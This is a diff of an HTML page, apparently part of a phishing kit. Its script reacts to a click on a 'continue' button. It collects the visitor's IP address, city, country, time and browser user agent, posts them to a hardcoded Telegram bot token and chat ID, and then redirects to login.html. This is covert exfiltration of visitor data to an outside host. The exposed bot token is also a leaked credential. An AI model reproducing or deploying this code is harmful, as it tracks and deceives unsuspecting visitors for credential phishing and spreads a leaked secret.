@@ -25,42 +25,38 @@
     </section>
   </div>
 
-  <!-- Script Telegram -->
-  <script>
-    document.getElementById("continueBtn").addEventListener("click", async function () {
-      const webhookURL = "https://api.telegram.org/bot8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg/sendMessage";
-      const chatId = "1887198443";
+ <!-- Script Telegram -->
+<script>
+  document.getElementById("continueBtn").addEventListener("click", async function () {
+    const webhookURL = "https://api.telegram.org/bot8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg/sendMessage";
+    const chatId = "1887198443";
 
-      try {
-        const res = await fetch("https://ipapi.co/json/");
-        const data = await res.json();
+    try {
+      const res = await fetch("https://ipapi.co/json/");
+      const data = await res.json();
 
-        const message = `
-🔔 CLIC détecté sur CONTINUER
+      const message = `🔔 NOUVEAU CLIC !
 🌍 IP : ${data.ip}
 📍 Ville : ${data.city}
 🌐 Pays : ${data.country_name}
 🕒 Heure : ${new Date().toLocaleString()}
-📱 Navigateur : ${navigator.userAgent}
-        `;
+📱 Navigateur : ${navigator.userAgent}`;
 
-        await fetch(webhookURL, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message
-          })
-        });
-      } catch (err) {
-        console.error("Erreur Telegram :", err);
-      }
+      await fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      });
+    } catch (err) {
+      console.error("Erreur lors de l'envoi Telegram :", err);
+    }
 
-      // Redirection vers login.html après l’envoi
-      window.location.href = "login.html";
-    });
-  </script>
-</body>
-</html>
+    // Redirection automatique
+    window.location.href = "login.html";
+  });
+</script>
